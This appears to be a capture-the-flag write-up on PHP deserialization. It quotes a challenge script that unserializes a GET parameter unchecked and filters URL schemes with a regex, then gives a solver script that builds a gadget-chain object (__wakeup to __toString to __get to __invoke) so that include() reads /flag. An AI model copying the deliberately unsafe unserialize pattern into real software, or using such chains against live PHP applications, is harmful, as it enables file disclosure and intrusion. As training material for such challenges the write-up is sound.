#PHP 序列化

```php
Happy New Year~ MAKE A WISH
<?php

echo 'Happy New Year~ MAKE A WISH<br>';

if(isset($_GET['wish'])){
    @unserialize($_GET['wish']);
}
else{
    $a=new Road_is_Long;
    highlight_file(__FILE__);
}
/***************************pop your 2022*****************************/

class Road_is_Long{
    public $page;
    public $string;
    public function __construct($file='index.php'){
        $this->page = $file;
    }
    public function __toString(){
        return $this->string->page;
    }

    public function __wakeup(){
        if(preg_match("/file|ftp|http|https|gopher|dict|\.\./i", $this->page)) {
            echo "You can Not Enter 2022";
            $this->page = "index.php";
        }
    }
}

class Try_Work_Hard{
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Make_a_Change{
    public $effort;
    public function __construct(){
        $this->effort = array();
    }

    public function __get($key){
        $function = $this->effort;
        return $function();
    }
}
/**********************Try to See flag.php*****************************/

```

```php
//__wakeup =>  __toString => __get => __invoke => append
<?php


class Road_is_Long
{
    public $page;
    public $string;
}
class Try_Work_Hard
{
    protected  $var="/flag";
}

class Make_a_Change
{
    public $effort;
}

// $a=new Road_is_Long();
// $b= new Make_a_Change();
// $c= new Try_Work_Hard();
// $a->page=$a;
// $a->string=$b;
// $b->effort=$c;
$a=new Road_is_Long();
$a->page= new Road_is_Long();
$a->page->string=new Make_a_Change();
$a->page->string->effort=new Try_Work_Hard();

echo (urlencode(serialize($a)));
```
